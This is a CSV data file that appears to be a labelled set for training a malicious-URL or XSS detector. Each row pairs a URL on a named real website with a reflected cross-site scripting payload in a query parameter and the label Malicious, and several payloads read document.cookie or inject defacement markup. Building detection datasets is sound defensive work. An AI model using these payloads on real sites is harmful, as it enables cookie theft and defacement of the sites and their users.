Payloads,Class
http://web.bobmarley.com/catalogue/index.jsp?catpage=singles%22%3e%3c/script%3e%3cscript%3ealert(%22<br>skyr3x%22)%3c/script%3e,Malicious
http://etomotors.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://kangzhuang.ucam.org/cgi-bin/access/access.cgi?aesu=1&amp;aesi=on&amp;aeck=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/<br>script&gt;,Malicious
http://www.plans.aol.fr/aol/map/map.asp?x=596269&amp;y=2426053&amp;scale=5000&amp;title=&lt;script&gt;alert(&quot;scriptori<br>um(turkey)hackhaber.com&quot;)&lt;/script&gt;,Malicious
http://launchtoday.launch.yahoo.com/player/error.asp?edsc=&gt;&lt;script&gt;alert('bugreport.ir xss for<br>xssed.com')&lt;/script&gt;&lt;!--&amp;reloaded=1,Malicious
"https://login.ign.com/login.aspx?r=';alert(string.fromcharcode(88,83,83))//\';alert(string.fromcharc<br>ode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,83))/<br>/--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
http://www.occula.com/search.php?min_cur=&amp;mode=advanced&amp;max_cur=&amp;seller=include&amp;seller_name=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://mangraovat.net/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.freewareweb.com/coupons/?s=godaddy.com%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scr<br>ipt%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://wasc.ir/tomcat-docs/appdev/sample/web/hello.jsp/1%3cscript%3ealert%28123%29%3c/script%3e,Malicious
http://is.kingsoft.jp/support/faq.htm?partner=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.hilton.com/en/hi/groups/index.jhtml?eventtype=&quot;&gt;&lt;script&gt;alert(&quot;rugburn was<br>here&quot;)&lt;/script&gt;,Malicious
http://www.spoke.com/info/srp?search.x=27&amp;search.y=8&amp;name=%22%3e%3cscript%3ealert(%22xss%20by%20the_<br>miller%22)%3c/script%3e%3cmarquee%3exss%20by%20the_miller%3c/marquee%3e,Malicious
http://sbox.kompass.com/kinl/static/index_searchbox.php?_lang=de&amp;_kprov=searchbox&amp;_keyword=%22%3e%27<br>%3e%3cscript%3ealert%28123%29%3c%2fscript%3e%22%27&amp;x=0&amp;y=0&amp;_choix=ps&amp;_zone=ww,Malicious
